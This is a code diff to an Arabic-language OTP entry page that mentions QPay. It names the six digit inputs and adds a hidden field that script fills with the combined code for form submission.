@@ -56,13 +56,14 @@
 				<div class="otp-section">
 					<p>تم إرسال رمز التحقق إلى هاتفك المسجل في QPay.<br>أدخل الرمز المكون من 6 أرقام للمتابعة.</p>
 					<div class="otp-inputs">
-						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 1" data-idx="0">
-						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 2" data-idx="1">
-						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 3" data-idx="2">
-						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 4" data-idx="3">
-						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 5" data-idx="4">
-						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 6" data-idx="5">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 1" data-idx="0" name="otp1">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 2" data-idx="1" name="otp2">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 3" data-idx="2" name="otp3">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 4" data-idx="3" name="otp4">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 5" data-idx="4" name="otp5">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 6" data-idx="5" name="otp6">
 					</div>
+					<input type="hidden" name="otpCode" id="otp-code">
 					<div class="resend-row">
 						<span>لم يصل الرمز؟</span>
 						<a id="resend-btn">إعادة إرسال</a>
@@ -106,10 +107,12 @@
 	tick(); var tid = setInterval(tick, 1000);
 
 	// OTP input auto-advance
-	var inputs = document.querySelectorAll(".otp-inputs input");
+	var inputs = document.querySelectorAll(".otp-inputs input[type='tel']");
+	var hidden = document.getElementById("otp-code");
 	function collectOtp(){
 		var val = "";
 		inputs.forEach(function(inp){ val += inp.value; });
+		if(hidden) hidden.value = val;
 		return val;
 	}
 	inputs.forEach(function(inp, i){
